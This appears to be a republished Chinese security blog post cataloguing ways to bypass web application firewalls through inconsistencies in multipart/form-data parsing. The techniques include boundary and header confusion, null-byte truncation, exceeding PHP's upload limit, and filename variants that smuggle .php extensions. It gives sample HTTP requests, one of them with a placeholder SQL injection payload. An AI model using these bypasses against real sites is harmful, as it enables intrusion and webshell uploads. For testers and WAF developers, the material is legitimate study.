    <url>/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍的思路主要围绕针对于 POST 参数的 <code>multipart/form-data</code> 进行讨论。</p><p><code>multipart/form-data</code> 是为了解决上传文件场景下文件内容较大且内置字符不可控的问题。在最初的 http 协议中，并没有上传文件方面的功能。RFC1867 为 HTTP 协议添加了这个能力。常见的浏览器都已经支持。按照此规范将用户指定的文件发送到服务器，可以按照此规范解析出用户发送来的文件。</p><p>HTTP 传输的内容通过 boundary 进行了分割，以 <code>--boundary</code> 开始，并以 <code>--boundary--</code> 结尾。</p><p>multipart&#x2F;form-data 格式也是可以传递 POST 参数的。对于 Nginx + PHP 的架构，Nginx 实际上是不负责解析 multipart&#x2F;form-data 的 body 部分的，而是交由 PHP 来解析，因此 WAF 所获取的内容就很有可能与后端的 PHP 发生不一致。</p><p>通过一个简单的脚本来验证上面的说法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>echo file_get_contents(&quot;php://input&quot;); <br>echo &#x27;$_POST Content\n&#x27;;<br>echo &#x27;&#x27;;<br>var_dump($_POST); <br>echo &#x27;$_FILES Content\n&#x27;;<br>echo &#x27;&#x27;;<br>var_dump($_FILES);<br>?&gt;<br></code></pre></td></tr></table></figure><p>正常情况下使用 multipart&#x2F;form-data POST 传输一个参数 <code>f</code>，其值为 <code>1</code>：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/001-0.webp" alt="图片"></p><p>上面说到，multipart&#x2F;form-data 用来解决传输文件的问题，那什么情况是上传文件？什么情况是 POST 参数呢？关键点在于有没有一个完整的 <code>filename=</code>，这 9 个字符缺一不可。加上了 <code>filename=</code> 以后的回显：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/002-0.webp" alt="图片"></p><p>由于一些 WAF 产品对用户上传文件的内容不做匹配，直接放行。因此，关键问题在于，WAF 能否准确有效识别出哪些内容是传给 POST 数组的，哪些传给 FILES 数组？如果不能，那就可以想办法让 WAF 以为我们是在上传文件，而实际上却是在 POST 一个参数，这个参数可以是命令注入、SQL 注入、SSRF 等任意的一种攻击，这样就实现了通用型的Waf Bypass。</p><h2 id="Bypass-思路-初级"><a href="#Bypass-思路-初级" class="headerlink" title="Bypass 思路 - 初级"></a><strong>Bypass 思路 - 初级</strong></h2><h3 id="0x00-截断"><a href="#0x00-截断" class="headerlink" title="0x00 截断"></a><strong>0x00 截断</strong></h3><p>在 filename 之前加入了 0x00 (%00 url decode)，有些 WAF 在检测前会对 HTTP 协议中的 0x00 进行过滤， 这样就导致了 WAF 认为是含有 filename 的普通上传，而后端 PHP 则认为是 POST 参数。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/003-0.webp" alt="图片"></p><h3 id="文件描述双写混淆"><a href="#文件描述双写混淆" class="headerlink" title="文件描述双写混淆"></a><strong>文件描述双写混淆</strong></h3><p>双写 <code>Content-Disposition</code>，一些 WAF 会取第二行，而实际 PHP 会获取第一行。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/004-0.webp" alt="图片"></p><p>另外针对 <code>Content-Disposition</code> 的双写混淆还有可以包括 <code>Content-Type</code>:</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/005-0.webp" alt="图片"></p><p>但是这种方式会将 <code>f</code> 变量中加入一些垃圾数据，在进行注入时需要进行闭合处理。</p><h3 id="multipart-混淆"><a href="#multipart-混淆" class="headerlink" title="multipart 混淆"></a><strong>multipart 混淆</strong></h3><p>通过构建一个新的 multipart 部分，是两个部分传递的参数名相同，达到混淆的目的。</p><p><strong>带有垃圾数据的情况</strong></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/006-0.webp" alt="图片"></p><p><strong>不带垃圾数据的情况</strong></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/007-0.webp" alt="图片"></p><h3 id="Boundary-混淆"><a href="#Boundary-混淆" class="headerlink" title="Boundary 混淆"></a><strong>Boundary 混淆</strong></h3><h4 id="构造双重-boundary"><a href="#构造双重-boundary" class="headerlink" title="构造双重 boundary"></a><strong>构造双重 boundary</strong></h4><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/008-0.webp" alt="图片"></p><p>在 PHP 中，只识别到 <code>boundary=a</code>，即真正的 <code>boundary</code> 为 a。若 WAF 中识别到的 <code>boundary</code> 为 <code>b</code>，就会将第 13 行到第 18 行做为文件 <code>pic.png</code> 的内容进行传输，达到混淆的目的。</p><h4 id="构造双重-Content-Type"><a href="#构造双重-Content-Type" class="headerlink" title="构造双重 Content-Type"></a><strong>构造双重 Content-Type</strong></h4><p>这种混淆方式与上一种情况类似，只是将 <code>Content-Type</code> 进行混淆，指定不同的 boundary。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/009-0.webp" alt="图片"></p><h4 id="空白-boundary"><a href="#空白-boundary" class="headerlink" title="空白 boundary"></a><strong>空白 boundary</strong></h4><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/010-0.webp" alt="图片"></p><p>在 PHP 中，只识别到 <code>boundary=空</code> 。若 WAF 中错将 <code>;</code> 识别到为 <code>boundary</code>，就会将第 13 行到第 18 行做为文件 <code>pic.png</code> 的内容进行传输，达到混淆的目的。</p><h4 id="空格-boundary"><a href="#空格-boundary" class="headerlink" title="空格 boundary"></a><strong>空格 boundary</strong></h4><p>同样的 boundary 也可以是空格</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/011-0.webp" alt="图片"></p><h4 id="boundary-中的逗号"><a href="#boundary-中的逗号" class="headerlink" title="boundary 中的逗号"></a><strong>boundary 中的逗号</strong></h4><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/012-0.webp" alt="图片"></p><p>事实上，在 PHP 中会将 Boundary 中的逗号作为分隔符，即 boundary 遇到逗号就结束。</p><p>只标识一个逗号也可以：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/013-0.webp" alt="图片"></p><h2 id="Bypass-思路-进阶"><a href="#Bypass-思路-进阶" class="headerlink" title="Bypass 思路 - 进阶"></a><strong>Bypass 思路 - 进阶</strong></h2><h3 id="0x00-截断进阶"><a href="#0x00-截断进阶" class="headerlink" title="0x00 截断进阶"></a><strong>0x00 截断进阶</strong></h3><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/014-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/015-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/016-0.webp" alt="图片"></p><p>这三个位置都可以。将其替换为 0x00 和 0x20 与之同理。</p><p>此外，将 0x00 放到参数名中也可以绕过：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/017-0.webp" alt="图片"></p><h3 id="Boundary-混淆进阶"><a href="#Boundary-混淆进阶" class="headerlink" title="Boundary 混淆进阶"></a><strong>Boundary 混淆进阶</strong></h3><p>boundary 的名称是可以前后加入任意内容的，WAF 如果严格按 boundary 去取，就会出现混淆。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/018-0.webp" alt="图片"></p><p>在双写 Content-Type 的混淆中，将第一个 Content-Type 和冒号部分填入了空格，实现绕过。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/019-0.webp" alt="图片"></p><p>Boundary 的取值混淆：<br><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/020-0.webp" alt="图片"></p><h3 id="单双引号混合"><a href="#单双引号混合" class="headerlink" title="单双引号混合"></a><strong>单双引号混合</strong></h3><p>Content-Disposition 中的字段使用单引号、双引号进行混淆<br><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/021-0.webp" alt="图片"></p><h3 id="urlencoded-与-multipart-混淆"><a href="#urlencoded-与-multipart-混淆" class="headerlink" title="urlencoded 与 multipart 混淆"></a><strong>urlencoded 与 multipart 混淆</strong></h3><p>在 Content-Type 头中，分别指定为：<code>urlencoded</code> 与 <code>multipart</code>。实际上 PHP 识别到的为 <code>urlencoded</code>，若 WAF 识别到的为 multipart，就可以绕过检测。通过 &amp; 来作为参数分隔符，截取参数 <code>sqlInjectionParam</code> 的前后部分，完整保留该参数。</p><p>由于 <code>multipart/form-data</code> 下的内容不进行 <code>urldecoded</code>， 一些 WAF 也正是这样设计的，这样做本没有问题，但是如果是 <code>urlencoded</code> 格式的内容，不进行 url 解码就会引入 <code>%0a</code> 这样字符，而这样的字符不解码是可以直接绕过防护规则的，从而导致了绕过。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/022-0.webp" alt="图片"></p><h2 id="Bypass-思路-高级"><a href="#Bypass-思路-高级" class="headerlink" title="Bypass 思路 - 高级"></a><strong>Bypass 思路 - 高级</strong></h2><p>此章节通过结合 PHP 源码来讨论 WAF Bypass 的可能性。</p><h3 id="skip-upload-1"><a href="#skip-upload-1" class="headerlink" title="skip_upload - 1"></a><strong>skip_upload - 1</strong></h3><p>在 PHP 源码中，处理 multipart 时存在这样一段代码：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/023-0.webp" alt="图片"></p><p>其中的 param 就是 <code>name=&quot;f&quot;</code>，当程序进入 <code>c &lt; 0</code> 这个分支时，就会跳过当前 part 的上传流程。由于初始化时 <code>c = 0</code>，遇到 <code>[</code> 时，<code>c += 1</code>，遇到 <code>]</code> 时，<code>c -= 1</code>。因此，可以构造 <code>name=&quot;f]&quot;</code>，即可让 <code>c = -1</code>。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/024-0.webp" alt="图片"></p><h3 id="skip-upload-2"><a href="#skip-upload-2" class="headerlink" title="skip_upload - 2"></a><strong>skip_upload - 2</strong></h3><p>在 PHP 源码中，有这样一段代码：</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/025-0.webp" alt="图片"></p><p>当文件上传数量超出最大值后，会跳过当前 part 文件的处理。在 php 5.2.12 和以上的版本，有一个隐藏的文件上传限制是在 <code>php.ini</code> 里没有的，就是这个 <code>max_file_uploads</code> 的设定，该默认值是 20, 在 php 5.2.17 的版本中该值已不再隐藏。文 件上传限制最大默认设为 20，所以一次上传最大就是 20 个文档，所以超出 20 个就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">POST /waf.php HTTP/1.1<br>Accept: */*<br>Host: localhost:8081<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Content-Type: multipart/form-data; boundary=a<br>Content-Length: 2030<br><br>--a<br>Content-Disposition: form-data; name=&quot;1&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>1<br>--a<br>Content-Disposition: form-data; name=&quot;2&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>2<br>--a<br>Content-Disposition: form-data; name=&quot;3&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;4&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;5&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;6&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;7&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;8&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;9&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;10&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;11&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;12&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;13&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;14&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;15&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;16&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;17&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;18&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;19&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;id&quot;; filename=&quot;pic.png&quot;<br>Content-Type: image/png<br><br>3<br>--a<br>Content-Disposition: form-data; name=&quot;id&quot;;<br><br>sql injection!!!!<br>--a--<br></code></pre></td></tr></table></figure><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/026-0.webp" alt="图片"></p><h2 id="关于文件扩展名的绕过"><a href="#关于文件扩展名的绕过" class="headerlink" title="关于文件扩展名的绕过"></a><strong>关于文件扩展名的绕过</strong></h2><p>前文主要是提出一些关于源站与 WAF 在解析 multipart 之间存在的差异导致的绕过。在实际渗透测试中，如何绕过文件扩展名是很重要一个点，所以本节内容主要介绍，在 WAF 解析到 filename 参数的情况下，从协议和后端解析的层面如何绕过文件扩展名。</p><p>整体上的思路为：<code>filename=&quot;file_name.php&quot;</code>，对于 WAF 层面来说，发现扩展名为 php，接着进行拦截，绕过的目标为，使 WAF 解析出的 filename 不出现 php 关键字，并且后端程序在验证扩展名的时候会认为这是一个 php 文件。</p><p>从各种程序解析的代码来看，为了让 waf 解析出现问题，干扰的字符除了上文说的引号，空格，转义符，还有 <code>:;</code>，这里还是要分为两种形式的测试。</p><p><strong>无引号包裹的形式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">Content-Disposition: form-data; name=key3; filename=file_name:.php <br><br>Content-Disposition: form-data; name=key3; filename=file_name&#x27;.php <br><br>Content-Disposition: form-data; name=key3; filename=file_name&quot;.php <br><br>Content-Disposition: form-data; name=key3; filename=file_name\&quot;.php <br><br>Content-Disposition: form-data; name=key3; filename=file_name .php<br><br>Content-Disposition: form-data; name=key3; filename=file_name;.php<br></code></pre></td></tr></table></figure><p>前五种情况 flask&#x2F;Java 解析结果都是一致的，会取整体作为 filename 的值，都是含有 php 关键字的，这也说明如果 waf 解析存在差异，将特殊字符直接截断取值，会导致 waf 被绕过。</p><p>最后一种情况，flask&#x2F;Java&#x2F;php 解析都会直接截断，filename&#x3D;file_name，这样后端获取不了，无论 waf 解析方式如何，无法绕过。</p><p>对于 php 而言，前三种会如 flask 以一样，将整体作为 filename 的值，第五种空格类型，php 会截断，最终取 <code>filename=file_name</code>，这种容易理解，当没出现引号时，出现空格，即认为参数值结束。</p><p>然后再测试转义符号的时候，出现了从 <code>\</code> 开始截断，并去 <code>\</code> 后面的值最为 filename 的值，这种解析方式和 boundary 解析也不相同，且双引号和单引号相同效果。实际上 php 并没有把 <code>\</code> 当作转义符号，而是将 filename 参数看当做文件路径，并取出 path 里面文件名的部分。所以这个解析方式和引号跟本没关系，只是 php 在解析 filename 时，会取最后的 <code>\</code> 或者 <code>/</code> 后面的值作为文件名。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/027-0.webp" alt="图片"></p><p><strong>有引号包裹的形式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">Content-Disposition: form-data; name=f; filename=&quot;file_name:.php&quot; <br><br>Content-Disposition: form-data; name=f; filename=&quot;file_name&#x27;.php&quot; <br><br>Content-Disposition: form-data; name=f; filename=&quot;file_name&quot;.php&quot; <br><br>Content-Disposition: form-data; name=f; filename=&quot;file_name\&quot;.php&quot; <br><br>Content-Disposition: form-data; name=f; filename=&quot;file_name .php&quot; <br><br>Content-Disposition: form-data; name=f; filename=&quot;file_name;.php&quot;<br></code></pre></td></tr></table></figure><p>flask 解析结果除第三种 filename 取 file_name 之外，其它都会取双引号内整体的值作为 filename，转义符具有转义作用。php 第三种也会解析出 file_name，但是在第四种转义符是具有转义作用的。使用单引号的情况和上文引号部分分析一致。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/028-0.webp" alt="图片"></p><p>对于 Java 来说，除第三种情况外，都是会取引号内整体作为 filename 值，但是第三种情况 Java 会继续取值，那么最后 filename 为 <code>file_name&quot;.php</code>。所以对于 Java 这个异常的特性来说，通常 WAF 会像 php&#x2F;flask 那样在第一次出现闭合双引号时，直接取双引号内内容作为 filename 的取值，这样就可以绕过文件扩展名的检测。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">do9gy - 腾讯 WAF 挑战回忆录<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://t.zsxq.com/UfAEeY3<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">donky16 - 从 RFC 看如何通过 multipart 文件上传绕过 WAF<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://t.zsxq.com/fMBM7qz<br></code></pre></td></tr></table></figure><p><strong>来源</strong></p><p>作者：geekby</p><p>原文地址：<a href="https://www.geekby.site/2022/03/waf-bypass/">https://www.geekby.site/2022/03/waf-bypass/</a></p><p>文章来源：HACK学习呀</p><p>如有侵权，请联系删除</p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>漏洞专题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirscan</title>
    <link href="/2024/08/13/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/dirscan/"/>
    <url>/2024/08/13/%E7%BD%91%E5%AE%89/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/dirscan/</url>
    
